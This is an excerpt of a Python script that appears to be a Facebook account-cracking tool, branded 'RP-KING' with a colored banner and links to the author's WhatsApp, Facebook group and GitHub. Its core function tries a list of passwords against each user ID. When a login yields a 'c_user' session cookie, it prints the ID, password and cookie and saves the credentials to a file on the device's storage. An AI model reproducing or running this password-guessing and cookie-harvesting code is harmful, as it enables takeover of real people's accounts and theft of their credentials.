...
\x1b[38;5;46m===============================================
 \033[1;31m[\033[1;32m[P]\033[1;31m]\033[1;32m DEVELOPER : PARVEZ AHMED
 \033[1;31m[\033[1;32m[A]\033[1;31m]\033[1;32m DEVELOPER : PARVEZ
 \033[1;31m[\033[1;32m[R]\033[1;31m]\033[1;32m FACEBOOK  : Er PARVEZ
 \033[1;31m[\033[1;32m[V]\033[1;31m]\033[1;32m GITHUB    : Parvez_09
...
def admin():
        ...
        if bal =='1':
                os.system('xdg-open https://wa.me/+8801751581953');time.sleep(1)
                admin()
        if bal =='2':
                os.system('xdg-open https://facebook.com/groups/735209235013629/');time.sleep(1)
                admin()
        if bal =='3':
                os.system('xdg-open https://github.com/RP-KING-143');time.sleep(1)
                admin()
        if bal =='0':
                Main()
...
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93m[RP-KING]\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m [RP-KING-OK] '+uid+' | '+ps+'\33[0;92m')
                print(f'\r\033[1;92m=[💚]=COOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/RP-KING-ok.txt', 'a').write(uid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1
